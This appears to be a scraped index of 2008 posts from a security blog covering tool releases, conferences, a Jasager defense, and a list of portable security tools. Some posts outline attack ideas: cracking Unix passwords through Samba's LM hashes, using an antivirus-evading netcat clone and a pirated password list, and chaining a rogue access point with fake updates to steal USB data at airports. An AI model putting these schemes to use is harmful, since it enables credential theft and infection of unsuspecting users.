use our UNIX users/pass combos for authenitcation. Then we use the LM cracking method of choice, and you get the clear text password. Using one cracking method to crack other encryptions. Again, just a theory as I haven’t tested it, but I don’t see why this wont work. I would say it’s about time for you to start using 15+ character passwords if you haven’t already. Merry Christmas! ","date":"2008-12-25","objectID":"https://malicious.link/posts/2008/2008-12-25-using-samba-to-crack-unix-passwords/:0:0","tags":null,"title":"Using SAMBA to crack Unix passwords","uri":"https://malicious.link/posts/2008/2008-12-25-using-samba-to-crack-unix-passwords/"},{"categories":["hardware","pranks"],"content":" Alright you all have heard of some of the annoying items that make ThinkGeek a one stop shop for cube warfare, such as the Annoy-a-tron and the Phantom Keystroker. Well nothing can hold a candle to the BSODomizer. Along the lines of the Annoy-a-tron and the Phantom Keystroker, this device is hardware and messes with your target on a timer based method. But what gets added to the mix is the fact that it has an IR reciever as well, so while you are giggling in your cube trying not to bust up laughing, you can actually use any Universal Remote set to the Sony TV code, a TV-B-Gone (Mitch Altman’s awesome invention), or even a computer that it set to send that signal from it’s IR port. There are a bunch of settings on the BSODomizer, including the NSFW option that spawned it’s name. It has both Windows and Mac blue screens and a multitude of timings. It also works with VGA to DVI converter and rumors have been heard of a two port and / or a DVI based one. I liked this thing so much I ventured into making my first video (which I begged Darren Kitchen to help edit, and he graciously did). Joe Grand of Kingpin Empire and Zoz released the BSODomzier on the world this year at DefCon 16. Here is what they they say about it on their site: BSODomizer is a small, battery-powered, mischievous electronic gadget that interfaces between a laptop or desktop and VGA monitor and flashes a fake BSOD (Blue Screen of Death) onto the monitor at random time intervals or when triggered by an infrared remote control. This will cause the user to become confused and turn off or reset his or her machine. You can also choose to pop up a much more sinister BGOD (Blue Goatse of Death) after the BSOD has been visible for a few seconds. The BSODomizer will automatically detect when the computer has been turned off or restarted and will revert to the harmless video pass-through mode, leaving the user unaware of any wrongdoing. Legitimate uses of the BSODomizer include monitor/projector/video calibration or as a simple timer to remind the user to take a break from sitting in front of the computer. Various configuration settings are selected via on-board DIP switches. BSODomizer Review from mubix on Vimeo. Check out the Manual for all of the possible options and the site for details on how to make one for your self or buy a pre-built. ","date":"2008-12-24","objectID":"https://malicious.link/posts/2008/2008-12-24-bsodomizer-cube-warfare-and-beyond/:0:0","tags":null,"title":"BSODomizer - Cube Warfare and Beyond","uri":"https://malicious.link/posts/2008/2008-12-24-bsodomizer-cube-warfare-and-beyond/"},{"categories":["rant"],"content":"Yesterday on Twitter I posed 3 questions: Question 1: Now that Clickjacking has faded away from “Newest Greatest BAD STUFF”, how many implemented NoScript personally? What about Enterprise wide? Question 2: Now, everyone who responded that you are still at IE in the enterprise. Why? Did you show the powers that be clickjacking and it’s effects? Question 3: Ok here is the final question of the trio, Why, since we rely on IE, aren’t we screeming at M$ to implement NoScript-like features? And Andrew Hay (twitter), one of the crazy smart guys from the party house above the US posted a great blog article (kinda redundant to say posted a blog post eh?) (and no that wasn’t a Canadian joke). And the following is my rebuttal to some of the things he said. First he goes into training. And I agree with him for the most part. The support teams are going to need to be trained to support Firefox, but exactly how many calls do you really expect that to be? The address bar is in the same place, tabs work the same, as do bookmarks. Importing bookmarks is a rather simple process as well, FF does it by default on first use. I guess the only person who can answer this is someone who has actually made the move from one browser to another. Second he touches on money. I take a bit of a different approach to this. I think that they (Cx0s) should spend the money on the Mozilla Foundation to build an enterprise deployment package, including an addon (extension) deployment engine and GPO tie in. But as far as as the testing, Q\u0026A, and support, if your company offers to work with Mozilla on an enterprise deployment, I am sure they will fall over themselves to help make it happen. Sure, there will be training to go along with the new deployment and management pieces, but most likely the people working with Mozilla to get it working will have such an indepth knowledge of the product by the time it gets rolled out enterprise wide that they will not need training. And finally, are you really telling me that any company on the planet pays to train all of their staff? In my limited experience it’s always been, send one, and he/she will train the rest. Third, Deus Ex Machina, when I first read this I instantly thought of the game Deus Ex, but basically as Andrew put it, it’s explaining in business terms, what the threat / risk is, what the FOI / ROI is, and how the deployment can happen to the mangement (Cx0? Writers of the check, WOTC is much less sexy than CSO eh?). My answer to this is that I agree compeltely. Enterprieses, be it corporate or government, are like giants. They can see much farther (industry insight is usually the main job of a CxO), they are very slow making steps (changes of any size). But here is the tweak, I think when they do make changes, like giants, they are huge steps forward. And, Andrew is right again, it usually takes a dedicated individual in the organization to push it to the point where finally people start listening. That person is going to the be the least popular person in the buisness but at the end of the ordeal, he/she will most likely either become very high ranking in the organization, or another company will take notice of the game changer, and pull them into their company hoping for the same fighting spirit to help their company flourish. But then again, it could end much worse. Some companies are so set in their ways that they refuse change and will repremand those who push it too hard. Check out out Marcus Carey of Sun Tzu Data’s post that sums up Deus Ex Machinca in one image. Last, Andrew point out the Blind Eye technique. Ostriches play this game and it never really ends well for them. This is a base (I have started to hate the word “fundemental” sine the elections) difference between security pros in the biz, some if they don’t see a risk, or it wide spread in the wild, they don’t see a rush. Marcin from TS-SCI Security made some twitter posts (#1, #2, #3) making some valid points. Are they wrong? No, not all, it’","date":"2008-12-20","objectID":"https://malicious.link/posts/2008/2008-12-20-enterprise-security-moving-a-giant/:0:0","tags":null,"title":"Enterprise Security - Moving a Giant","uri":"https://malicious.link/posts/2008/2008-12-20-enterprise-security-moving-a-giant/"},{"categories":["burp","releases"],"content":" It’s official Burp Suite 1.2 is officially released to the masses. It includes a whole host of new features. Mainly (the ones spoke of in the blog post about the release): Site map showing information accumulated about target applications in tree and table form Suite-level target scope configuration, driving numerous individual tool actions Display filters on site map and Proxy request history Suite-wide search function Support for invisible proxying Fully fledged web vulerability scanning (pro version only) Ability to save and restore state (pro version only) You can download the new version at http://www.portswigger.net/suite/download.html ","date":"2008-12-15","objectID":"https://malicious.link/posts/2008/2008-12-15-burp-suite-v12-released/:0:0","tags":null,"title":"Burp Suite v1.2 Released","uri":"https://malicious.link/posts/2008/2008-12-15-burp-suite-v12-released/"},{"categories":["internet"],"content":"It’s not quite the snooze button I asked for, but it will do. Google implemented Gmail Tasks inside of Gmail Labs. Here is the blog post about it: http://gmailblog.blogspot.com/2008/12/new-in-labs-tasks.html ","date":"2008-12-14","objectID":"https://malicious.link/posts/2008/2008-12-14-gmail-tasks/:0:0","tags":null,"title":"Gmail Tasks","uri":"https://malicious.link/posts/2008/2008-12-14-gmail-tasks/"},{"categories":["releases"],"content":" If you haven’t seen it yet, I posted about a Nerv-Labs Live DVD that included all kinds security distros in one bootable DVD. Which was also featured in Episode 0x415 of Hak5. Well, there were some things that it was kinda lacking, mainly Helix and Samurai. Well, my buddy Marcus Carey from SunTzu Data did it up right. Let me introduce SumoLinux. SumoLinux has the following linux distributions on it: Backtrack 3 Helix 2.0 Samurai Linux DBAN DVL DOWNLOAD IT HERE: http://thepiratebay.org/torrent/4527605/SUMO_Linux You probably know what Backtrack 3 is, it’s the distro that is produced by the guys at Offensive Security. Helix 2.0 is the forensics distro, and Samurai is the awesome web application attack/assessment distro put out by InGuardians. But the last two you may not have heard of. DBAN (Darik’s Boot and Nuke) is a disk wiping boot cd that has templates for DoD, Gutmann, and PCMP wiping standards. And last but not least is DVL (Damn Vulnerable Linux) which is a distro where you can learn security, starting from basic netcat listening to exploit development. Thanks go to Marcus for making our dreams come true, now if I could just get another USB stick to put this on. Unetbootin here I come! ","date":"2008-12-10","objectID":"https://malicious.link/posts/2008/2008-12-10-ask-and-you-shall-receive-sumolinux/:0:0","tags":null,"title":"Ask and you shall receive - SumoLinux","uri":"https://malicious.link/posts/2008/2008-12-10-ask-and-you-shall-receive-sumolinux/"},{"categories":["guest posts"],"content":"Guest Article By: Ryan Pfleghaar (post_break) of iamthekiller.net DEFENDING AGAINST JASAGER Jasager has been making people question wireless security since episode one of season four on Hak5. The number one question besides “How do I get this to work” is “How do I protect myself?”. This exploit in wireless security has been somewhat of a challenge to protect against and with this article I am going to detail how Mubix and I came up with a quick and easy fix. A few recommendations to safe guard yourself were using a VPN or turning off wireless and using a 3G card while in the public. These two options do work however they can be expensive and not user friendly. After brainstorming a bit I came up with the idea of an application you could run while out in public airspace to check for multiple access points originating from a single point. This could be done by querying the access points and checking the signal strength against the BSSID. By knowing that a single MAC address is broadcasting multiple access points you can consider it a Jasager like device. My theory is broken when you factor in a device such as a FON that legitimately broadcasts multiple access points during normal operation. My university does this with Cisco access points broadcasting a PEAP encrypted connection and an unencrypted network to which you must accept a TOS in order to connect from a single device. Taking a step back we looked at how this exploit actually operates. When you turn on your laptop it will send out probes to see which networks are available and connect to the access point highest on the priority list. This default action is the key to the puzzle. By creating an access point in your preferred networks list titled “Jasager Detected” and pushing it to the highest priority you will now know when a Jasager device is being used. If you ever scan to see what networks are available and see the access point “Jasager Detected” then itʼs a good idea to check your email at home instead of the coffee shop or airport. There are a few pitfalls to this method however. If you scan the area with anything other than what you use to connect your laptop to the network “Jasager Detected” will not show up in the access point list. Chances are you will see a hidden network with no security, that being the airbase-ng or jasager access point. You need to scan the area using either windowʼs built in wireless connection utility or that provided for your wireless card. This same theory goes for Macs as well. Another pitfall to this quick fix is that you could in theory join the “Jasager Detected” access point without realizing it and quickly become a victim. You need to be alert when you go to public places with your laptop and make sure your dummy access point is not within range. What I like about this fix is how theoretically low tech it is. This is not a software or hardware specific guide and you can tell just about anyone how to do it regardless of skill level. I was even able to reproduce the fix on an iPhone so you should be able to protect yourself on mobile devices. Now Iʼd like to say something about this fix. This is not a complete patch in wireless security. I could modify my airbase script to not publish the access point “Jasager Detected” and if you were following this guide then you could easily become a victim [Thanks to Robin Wood who develops Jasager for out this caveat]. Another thing is that some operating systems have trouble with these preferred networks. If you really want to make sure you are in somewhat safe airwaves make up a completely random name for an access point and try to join it. If you connect then you know for a fact a Jasager device is in range. I would like to reiterate Ryan’s last point. Think up so random name that you think you would never see, and put it in your prefered list at the top. If it pops up, you know that their is something fishy going on. Another mesaure you can take, and thanks goes rAWjAW of rawjaw-security.blo","date":"2008-12-07","objectID":"https://malicious.link/posts/2008/2008-12-07-jasager-on-the-defensive/:0:0","tags":null,"title":"Jasager: On the Defensive","uri":"https://malicious.link/posts/2008/2008-12-07-jasager-on-the-defensive/"},{"categories":["rant"],"content":" I have had this rant on Twitter (if they had threading I would link to it). I have also had it in person a half dozen times at CSI Annual. And a piece of it was touched on a piece of the puzzle by Jack Daniel on his blog posting “The Fallacy of Penetration Testing”. We as “Security Professionals” have a big problem. We usually don’t have the power to make change. This has been a fight that every one of us has gone to bat for and usually lost. We are basically security guards without guns. We don’t have the ability to shoot that intruder if he trys to step up. Now, that is an over simplification, but you understand what I mean. So we all want the power, but are we ready for the consequences that such power brings? Are you ready to loose your job or go to jail if someone breaks into your network? Again, an over simplification, and I understand there are things outside the control of all of us, but if you implement security policyes, and products, and they fail, why do we just go ‘oh well, lets mitigate and try to catch them the next time’. I don’t think that the security community as a whole is ready for such power or the consequences it brings. I know this is going to be a very controversial issue, so fell free to post your comments. Tell me why you think we are ready for the guns. ","date":"2008-12-06","objectID":"https://malicious.link/posts/2008/2008-12-06-security-guards-without-guns/:0:0","tags":null,"title":"Security Guards without guns","uri":"https://malicious.link/posts/2008/2008-12-06-security-guards-without-guns/"},{"categories":["tools","releases"],"content":"This is just a quick blurb because Tom from the Security Justice Podcast already has a great post about all the changes: Check out his post here: http://spylogic.net/item/382 New link: http://www.spylogic.net/2008/12/maltego-201-released/ ","date":"2008-12-06","objectID":"https://malicious.link/posts/2008/2008-12-06-maltego-201-released/:0:0","tags":null,"title":"Maltego 2.01 Released","uri":"https://malicious.link/posts/2008/2008-12-06-maltego-201-released/"},{"categories":["rant","internet"],"content":"Gary Vaynerchuk of Wine Library TV made a post about Ego Searching. He describes in this short video that ego searching when you are trying to make a brand is simply caring about your audience: Now even Leo Laporte, while being interviewed on the Geek Cred podcast said that as a broadcaster (which can be translated into “Content Producer”), your audience is the most important thing and your responsibility is to them. Well, in this post I will show you a way to ego surf efficiently, taking it to a whole new level to save you time, without sacrificing the interaction that Gary V. detailed: So lets start with Google Alerts. Google Alerts are a way to get an update whenever there is a new search result for a specific search. Instead of going on the Google’s Blog Search every day or every hour, you can get an email whenever there is a new result: Search Terms: Whatever your brand is Type: This is where it starts to get interesting, choose Comprehensive and it will search blogs, news, regular google, videos and google groups. How Often: As it happens, daily or once a week updates Deliver To: You can either get it as an RSS feed or straight to your email. Well, here is the slight problem with that. You will be getting updates every time you post anything. Lets add some google hacking to these search results so we can get the most bang for our buck: For example, my search would be: link:room362.com -site:room362.com This would give me results whenever someone has a link to room362.com on their page, except when it’s on my domain (room362.com). Now, if you are looking at branding it can get much more complicated: Here is one of my searches: mubix -site:room362.com -site:mubix.blogspot.com -site:hak5.org -site:mubix.vox.com_ This search gives me results whenever “mubix” is even mentioned except when it’s on one of the sites. And you can edit these results all you want. Upping your Google Fu is the name of the game. You can use Google Alerts for all kinds of things. Another one that I have is “Call for Papers”. I have made added a lot of Google Fu to that search so that it just does security gigs, so customize the searches to what you want to see. Now, if you want to take all of this to the extreme, check out MonitorThis. Happy Ego Surfing Caring, mubix ","date":"2008-12-06","objectID":"https://malicious.link/posts/2008/2008-12-06-ego-surfing-or-caring/:0:0","tags":null,"title":"Ego Surfing or Caring?","uri":"https://malicious.link/posts/2008/2008-12-06-ego-surfing-or-caring/"},{"categories":["internet"],"content":"Unless you have been hiding under a rock, or just started reading this blog today. You have heard about GoPC. I featured it in my USB Goodies 2008 and I love their product. Now that they have entered into a “Strategic Alliance” with a company called ThinLinX. Now, the details of this alliance and the future it holds aren’t clear at the moment. And of course I have my own speculations. What are yours? To kind of get the ball rolling I’ll give you a brief intro to each company: GoPC allows you to either through a web interface, or a portable app that you can have on a thumb drive, you can login to a virtual desktop. Having the ability to take a powerful machine with you whereever you go without having to lug around a laptop is a great experiance. I plug in my USB or surf to their site on an computer and I am instantly on my own customized desktop. ThinLinX has incorporated the power and speed of NoMachine NX into a tiny box. These thin clients are set up to only allow the connection back to the mothership and connect you to your desktop. Making it a relatively safe enviroment for you to login to enterprise email, surf the intra and inter nets. Now, as a security addict, I tried to say away from word like “Cloud Computing” and “Secure”. Mostly becuase they have both become bad words in the industry. I plan on getting one and putting it through the ringers as it is the first thin client that I can afford at 99 bucks! I can’t wait to see what comes of these two companies. Check out their press release at: http://www.gopc.net/blog/?p=40 - Archive.org link ","date":"2008-12-05","objectID":"https://malicious.link/posts/2008/2008-12-05-gopc-links-with-thinlinx/:0:0","tags":null,"title":"GoPC links with ThinLinX","uri":"https://malicious.link/posts/2008/2008-12-05-gopc-links-with-thinlinx/"},{"categories":["rant"],"content":" I use gmail. Not really a big admission nor, very hard to find out. But the reason I use it is becasuse of it’s theading and archiving. For me those two abilities are unmatched anywhere else, both Outlook and Thunderbird fail horribly at this. More to the point, I have reached a certain level of ‘zen’ with my GTD methods on gmail. I am in a constant battle for “Inbox Zero” and have “Starring” extremely useless for me. My problem lies in the fact that I have email threads that I am waiting on people to reply or I simply want to reply later. While keeping them in my Inbox is alright, it is a mental block in my quest for Inbox Zero to have to go to the next page of emails and work from there due to the first page being full of followups. So, I thunked on the problem and came up with the idea of a snooze button. I would like a snooze button in gmail where I can click a email thread, and it asks me for a date and time period and possibly a note to tag along with it. And then, on that date or elapsed period of time OR a new email enters the thread, the thread reappears in my Inbox. I realize that you can Star, then archive, and then check your stars, but that doesn’t work for me, it is simply like making a second inbox to manage. If anyone has any ideas on how to make this happen or a contact at google that would be willing to listen to the idea, please leave a comment or shoot me an email. ","date":"2008-11-29","objectID":"https://malicious.link/posts/2008/2008-11-29-gmail-snooze-button/:0:0","tags":null,"title":"Gmail Snooze Button","uri":"https://malicious.link/posts/2008/2008-11-29-gmail-snooze-button/"},{"categories":["blogging"],"content":"Alan posted this about the SBN: Well there is not much sense keeping it a secret any longer, as others have already blogged on it. The Security Bloggers Network is going Lijit. Working with the folks who bring you Lijit search widgets, the Security Bloggers Network has a new home. You can find site at http://www.securitybloggers.net (thanks to Tyler Reguly of http://www.computerdefense.org) and at http://www.securitybloggersnetwork.com (this may still be resolving). Either URL should work. You can subscribe to the new feed here.StillSecure, After All These Years, Nov 2008 If you don’t know what the Security Bloggers Network is, it is a colition of security blogger’s feeds, allowing you the reader to only subscribe to one feed, while getting a dynamic set up updates from all kinds of bloggers. ","date":"2008-11-23","objectID":"https://malicious.link/posts/2008/2008-11-23-sbn-move-to-lijit/:0:0","tags":null,"title":"SBN move to Lijit","uri":"https://malicious.link/posts/2008/2008-11-23-sbn-move-to-lijit/"},{"categories":["internet"],"content":"I thought today’s dilbert fit me to a ‘T’: Originally Posted: http://dilbert.com/strips/comic/2008-11-21/ ","date":"2008-11-21","objectID":"https://malicious.link/posts/2008/2008-11-21-today-in-dilbert/:0:0","tags":null,"title":"Today in Dilbert","uri":"https://malicious.link/posts/2008/2008-11-21-today-in-dilbert/"},{"categories":["shmoocon","cons"],"content":"Update - Shmoocon already had a list: http://lists.shmoo.com/mailman/listinfo/shmoocon-roommates Go with what your readers want right? Well I have recently been getting a lot of hits on finding room sharing at ShmooCon. I have done this before at cons and I have met some very interesting people. So I created the google group ShmooCon RoomShare. Post that you are looking, post that you have space. It’s all voluntary and you can sign up for email alerts so that you don’t have to check it all the time. Plus, you don’t have to share for free, if you are looking to split a room, the conversation can start there. ","date":"2008-11-14","objectID":"https://malicious.link/posts/2008/2008-11-14-shmoocon-room-sharing/:1:0","tags":null,"title":"ShmooCon Room Sharing","uri":"https://malicious.link/posts/2008/2008-11-14-shmoocon-room-sharing/"},{"categories":["shmoocon","cons"],"content":" Even if you have been to ShmooCon, something that alludes most con-goers is the Hack or Halo contest. Most of the time you will see it’s organizers at table near the registration desk getting people signed up. What you may not know is how the whole thing goes down. It’s after hours so, you aren’t missing the great content during the day, and it might save you a few dollars of money spending bar time. But the primary purpose of Hack or Halo isn’t to put money back in your pocket (and yes it’s free). The primary purpose is to get your game on be it gaming or hacking. Actually Chris Compton spells out what goes down really well on the Hack or Halo blog in his post called “In The Beginning”. I would suggest that for a leg up on the rest of the contestants, you slap the blog in your RSS feed and follow them on twitter @HackorHalo. You never know, they might ‘accidentally’ release some pertinent information. Primary excuses for not participating: I didn’t bring my tools You are the tool, download BT3 VM put boot it up, update it, take diable the TCP/IP stack on your sisters laptop that you borrowed for the con and you are already better off than some of the other contestants I’m not go enough If Zeff comes for Halo, or Chris Eagle is allowed to hack, you are right, you aren’t, but damn would you have some bragging rights if you kicked their arse. I’m doing something that night No, you really aren’t… you know it, I know it. Now that we got it all straight. See you there. P.S. The picture is @Kym_Possible from the Hack or Halo squad. For most geeks out there, she will be reason enough to sign up. And yes, I may die tomorrow for posting this. ","date":"2008-11-10","objectID":"https://malicious.link/posts/2008/2008-11-10-hack-or-halo-5-at-shmoocon-2009/:0:0","tags":null,"title":"Hack or Halo 5 at ShmooCon 2009","uri":"https://malicious.link/posts/2008/2008-11-10-hack-or-halo-5-at-shmoocon-2009/"},{"categories":["internet"],"content":"Many of you know who operat0r is, Darren in particular since operat0r pulled a magic trick on Darren’s ACER ONE (Archive.org Links) that turned it from brick to badass in less than 5 minutes. But what some of you may not know is that ol’ McCurdy (operat0r) has some other awesome side projects that run the same course as my style of apps. PORTABLE. But these aren’t the standard portable apps that I find on the net. Well… let me just get to the list. Oh and I’m not linking directly to the projects because the download links change as he updates the tools. w3af PORTABLE MetaSploit PORTABLE WebScarab PORTABLE You can find all of these awesome McGoodies at operat0r’s site: http://rmccurdy.com/ ","date":"2008-11-07","objectID":"https://malicious.link/posts/2008/2008-11-07-mcgoodies-from-operat0r/:0:0","tags":null,"title":"McGoodies from operat0r","uri":"https://malicious.link/posts/2008/2008-11-07-mcgoodies-from-operat0r/"},{"categories":["internet","hfc","theacademy"],"content":"Ok, it’s not to you, but it is to a good cause. Here is their blurb: Hackers for Charity helps non-malicious hackers gain valuable job experience by putting them to work on projects for charity. They also build computer classrooms to help children and adults break the cycle of poverty through empowerment training, and feed children with funds raised by sales of Johnny Long’s books. This month, I thought that it would be fun to partner up with Hackers for Charity in order to raise money for the people of Uganda. The Academy has offered to donate $1 to Hackers for Charity for every user that registers for a free account at www.theacademy.ca for the entire month of November. If you’re a registered user already please forward this email or post it on a blog. Anything you can do to spread the word would be greatly appreciated. Let’s try to make a substantial donation to charity this month. Thanks everybody! So head on over and sign up. It’s free and you can feel better about yourself. Plus you can help me in my goal to make The Academy’s Director broke. ","date":"2008-11-07","objectID":"https://malicious.link/posts/2008/2008-11-07-the-academy-is-giving-away-money/:0:0","tags":null,"title":"The Academy is giving away money!","uri":"https://malicious.link/posts/2008/2008-11-07-the-academy-is-giving-away-money/"},{"categories":["internet"],"content":"So I have graduated from the black and green standard hacker theme (with forest header) to a much easier to read and iPhone friendly theme. I have also added a few things to the site. Probably the most noticeable is the new logo. The logo was the created by my good friend TestMAD. He is a starving graphic artist that runs the IRC network ThinStack. He also supports a number of other projects like Geekcred, and Wess Tobler’s new project, Unpersons. ","date":"2008-11-07","objectID":"https://malicious.link/posts/2008/2008-11-07-a-new-look-and-feel/:0:0","tags":null,"title":"A new look and feel","uri":"https://malicious.link/posts/2008/2008-11-07-a-new-look-and-feel/"},{"categories":["internet"],"content":"Haven’t had enough conferences yet? First, thanks to everyone who entered through email, twitter and commenting on the CSI give away. Second we do have a winner so please stop the flood. But, on to the show. The SC World Congress, Dec. 9-10, 2008, at the Javits Convention Center in New York is offering a dicount code to all readers of SBN (Security Blogger’s Network). But what is “The SC World Congress” Here is what they say: _The SC World Congress, presented by SC Magazine, is the conference and expo that information security professionals won’t want to miss. Faced with the challenges of safeguarding their organizations’ customer data and intellectual property, complying with a long list of regulatory demands, and staying abreast of new threats and even newer applications, these pros will find at the SC World Congress expert insight and advice they can use. Over two days of plenary sessions, targeted panels and an instructive expo floor, the SC World Congress features the actionable, inside information that IT security and corporate management needs to safeguard their company’s critical assets from threats, such as malware, targeted attacks, careless – or malicious – employees, and even careless executives. At the SC World Congress, attendees from all the major verticals – such as finance, health care, government, and more – will gain insight from industry leaders and fellow security professionals as SC Magazine explores the need-to-know topics that help IT security professionals do their jobs better._ Here’s the blurb on how to get a discount: “_35% discount against the conference rates for all of your blog readers. Just ask your readers to enter the promotional code BLOG1 (for a one day pass) or BLOG2 (for a two day pass) when they register at _www.scworldcongress.com” If you are in New York or can get your company to pay the full fair (wink wink) then you are set. I took a quick look through the speaker’s list and didn’t recognize any names, but that doesn’t mean much. The price points are as follows: $1095 - Conference Two day pass $795 - Conference One day pass FREE - Expo only pass FREE - Exhibitor registration COMPLIMENTARY - Press (Press ID required on site) ","date":"2008-11-06","objectID":"https://malicious.link/posts/2008/2008-11-06-sc-world-congress-2008/:0:0","tags":null,"title":"SC World Congress 2008","uri":"https://malicious.link/posts/2008/2008-11-06-sc-world-congress-2008/"},{"categories":["cons","internet","csi"],"content":"What is CSI? This is what CSI says about it: Security is in transition. There is general agreement that security does not work, but not on how to fix it. CSI 2008 is the only event today that faces the challenge to reconsider security. This year at CSI’s annual event, the most innovative minds in security will grapple with the tough questions, providing a reality-check and alternative to cookie-cutter conferences that merely tweak the status quo. I haven’t been to CSI yet, but I will be going this year and it seems like an outstaning conference. Far from ShmooCon but still packed with rockstars such as Jeremiah Grossman and Andy Willingham. Cool, but what is the title about?! Well, I, along with each of the other SBN members have been authorized to give away a free conference pass! All you have to do is name the DLL that was patched in MS08-067. First person to get that answer to me, be it IM, email, or twitter, wins the pass. Ok, what if I don’t win, can I still get something? Sure! Use the coupon code: BLOG25 to get 25 % off your admission._ TIME IS LIMITED_. This conference starts the week of November 15th. http://www.csiannual.com/ for more details. What do I get out of this ad? Nothing, I was already going. See you there! We have a winner! - But that doesn’t mean other SBN members aren’t also giving away free passes: http://www.mckeay.net/2008/10/31/tell-me-your-security-or-it-horror-story-and-win-a-pass-to-csi/ ","date":"2008-10-31","objectID":"https://malicious.link/posts/2008/2008-10-31-free-pass-to-csi-2008/:0:0","tags":null,"title":"Free Pass to CSI 2008","uri":"https://malicious.link/posts/2008/2008-10-31-free-pass-to-csi-2008/"},{"categories":["rant"],"content":"Hi, and welcome to my trap. I see a ton of searches of just your type on my site on a daily basis. Lets get down to ranting. Maltego is an awesome tool, it’s also GIVEN AWAY for FREE.. As in beer, which they allow you to use their servers to do your stupid little ego searches on.** STOP TRYING TO STEAL IT.** Offensive Security 101. This is by far the best course / certification that I have attempted thus far in my career. It is informative and challenging. STOP TRYING TO STEAL IT. Just to sum up a bit and not sound like a total ass. I fully support the use of torrents, for many of it’s uses. I do not however support the torrenting of projects such as this. The Offensive Security people contribute day and night with the development of BackTrack 3, which is again, free. Paterva also gives away the use of their Community Edition of Maltego for free. Instead of just taking from the community like the leech that you are, try contributing something. \u003c/rant\u003e Those who frequent my blog, I am sorry, this rage is not intended for you. ","date":"2008-10-24","objectID":"https://malicious.link/posts/2008/2008-10-24-maltego-keygen-crack-torrent-and-offensive-security-torrent/:0:0","tags":null,"title":"Maltego Keygen Crack Torrent and Offensive Security Torrent","uri":"https://malicious.link/posts/2008/2008-10-24-maltego-keygen-crack-torrent-and-offensive-security-torrent/"},{"categories":["podcasting"],"content":"Recently there has been a lot of people in my scope that have been wondering about what “hacker” or security related podcasts are out there. iTunes does a horrible job at categorizing anything past “Technology”. That is where Hacker Media.org comes in. Not only can you get the main feed of ALL the hacker/security related podcasts out there, you can get even deeper. Droops, the maintainer of said monster, makes it so you can pick and choose what kind of shows you want to see by having individualized feeds based on categories, and as shows come and go from those categories the feed changes with it. Like hardware hacking, phreaking, linux, or just a stubborn BSD junkie. The other thing is, each show might belong to multiple categories Your search is over, check out http://www.hackermedia.org/ and drop one of the feeds into your pod cruncher of choice. Another awesome way to use this resource is dropping the feeds into Google Reader. Now you take the iPod out of the equation and you can keep up to date and play all of the shows you love directly from your browser. ","date":"2008-10-23","objectID":"https://malicious.link/posts/2008/2008-10-23-hacker-media/:0:0","tags":null,"title":"Hacker Media","uri":"https://malicious.link/posts/2008/2008-10-23-hacker-media/"},{"categories":["usb","portable apps"],"content":"**EDIT: **Switching something from “DRAFT” to “PUBLISH” is a really important step. Sorry guys. Let me preface all of these tools with, the fact that some don’t come “portable”. To make them so, I have dropped the installer / setup file into Universal Extractor and then cleaned up the directory. PortSwigger’s Burp Suite - http://portswigger.net/suite/ This tool is essential to any web application security guru’s tool belt. If you haven’t used it already it is time to get schooled up on this wreaking ball. Network Miner - http://sourceforge.net/projects/networkminer/ Takes a live feed, or a pcap file and dumps files, frames, and runs p0f. It even allows you to do searches for keywords like “password” NZB-O-Matic Plus - http://www.bunnyhug.net/nomp/ I swear by this tool for downloading NZB files. Now other people us hellanzb on Linux. There is another one that was even more recommended for Linux but I can’t remember it at the moment. I’ll find it and post it to Mubix’s Links or if someone wants to comment on this post. Wootalyzer - http://www.wootalyzer.com/ Woot.com has one awesome deal each day that shows up like clock work at 1 AM EST, and always 5 dollars shipping. (Yes, even if it is a 60 inch plasma). And if you get as addicted to Woot as my family has, this application is a must. FastStone Capture - http://www.faststone.org/FSCaptureDetail.htm Still hands down the best screen capture utility known to man. You can still find the Freeware version out there if you look around a bit. The built in editor, ruler and color picker just add to it’s awesomeness HFS (HTTP File Server) - http://www.rejetto.com/hfs/ Always at the top of my list, this tool has been my most valuable asset on my USB keys for a couple years now. Looking Glass - http://portal.erratasec.com/lg/ A tool by Errata Security, it’s designed for checking files on Vista to see which ‘advanced security’ features aren’t being used, such as ASLR, NX and unsafe functions (swprintf) MobaLiveCD - http://mobalivecd.mobatek.net/ Allows you to boot a LiveCD within your Windows environment using QEMU. Booting Back Track 3 works but the networking side is a bit flaky. Can’t wait to see where this project goes. Process Explorer - http://technet.microsoft.com/en-us/sysinternals/bb896653.aspx If you haven’t switched out Task Manager with Process Explorer yet I think you have been living in a cave…. Well, get to it! In fact, put the whole Sysinternals Suite on your usb stick - http://technet.microsoft.com/en-us/sysinternals/bb896653.aspx GoPC - http://www.gopc.net/ I haven’t had to use this that much, but when I have it has come in really handy. Best way to describe it is a remote desktop that you don’t have to maintain. You can install the app on your USB stick and be ready to login at the drop of a hat. It uses port 22 to tunnel the connection automagically. sbd - http://www.cycom.se/dl/sbd This awesome gem was the result of taking the Offensive Security 101 course. It’s a netcat clone that adds some nice encryption features to the mix as well as being less detected via VirusScans. SmartSniff - http://www.nirsoft.net/utils/smsniff.html This tool is on the list along with all of the tools by nirsoft, because of it’s portability. I can fire up SmartSniff, look at the packets there, or dump them to a pcap file for inspection via WireShark or Network Miner later. -=Xploitz=- Master Password Collection - http://thepiratebay.org/torrent/4017231/-_Xploitz-_Master_Password_Collection This is an awesome collection of password files, extract, combine, sort, uniq and you have about a gig worth of passwords to check against. Peer Guardian - http://phoenixlabs.org/pg2/ A must have for anyone torrenting files, legal or not. Plus the fact that you can make your own ACLs makes it an instant win. When I am in an airport I usually fire PG2 up with my ‘local’ ACL list and have it block everything but my gateway and DNS. Proxifier PE - http://www.proxifier.com/ One of the only tools that I would r","date":"2008-10-16","objectID":"https://malicious.link/posts/2008/2008-10-16-usb-goodies-2008/:0:0","tags":null,"title":"USB Goodies 2008","uri":"https://malicious.link/posts/2008/2008-10-16-usb-goodies-2008/"},{"categories":["Hacking"],"content":"So there I was… Today I was sitting at home watching Irongeek’s post of John Strand’s talk Defense In Depth is Dead, Long Live Defense In Depth. And I had one really evil thought: Someone (such as Bob), could sit at an airport. We all do this it isn’t difficult. He could then turn on his laptop and connect it the airport wireless. Another task, difficult for some, but lets go with Bob being able to. Bob then, pulls out a Fon with Jasager on it. He then connects it to his newly started laptop running evilgrade. Bob’s setup for evilgrade installs and runs the USB Hacksaw payload. Now, every computer that is duped into connecting through Jasager automatically installs a payload that will copy and send all data from any inserted USB stick to… This post is already evil enough, so I will leave it up to you to figure it out. That is also why I haven’t included any in-post links. For the cost of an airline ticket, Bob has possibly infected and/or circumvented your whole defense in depth strategy. In closing. Don’t be like Bob. Bob is in jail. 